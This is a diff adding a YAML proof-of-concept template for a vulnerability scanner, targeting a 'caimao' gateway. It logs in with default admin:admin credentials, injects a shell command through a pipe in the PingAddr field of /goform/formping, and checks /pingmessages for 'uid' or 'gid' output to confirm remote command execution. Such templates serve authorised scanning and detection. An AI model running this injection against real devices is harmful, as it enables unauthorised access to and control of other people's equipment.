@@ -1,0 +1,34 @@
+name: poc-yaml-caimao-gateway-rce
+detail:
+  author: yesha
+  links:
+    - https://yesha.com
+  vulnerability:
+    level: critical  
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /goform/formping
+      follow_redirects: false
+      headers:
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Accept-Encoding: gzip
+      body: | 
+        PingAddr=127.0.0.1|id&PingPackNumb=1&PingMsg=
+    expression: >-
+      response.body_string.contains("Start") && response.body_string.contains("Tip") 
+  r1:
+    request:
+      method: GET
+      path: /pingmessages
+      follow_redirects: false      
+      headers: 
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Accept-Encoding: gzip
+    expression: >-
+      response.body_string.contains("uid") || response.body_string.contains("gid")
+expression: r0() && r1()
+
+
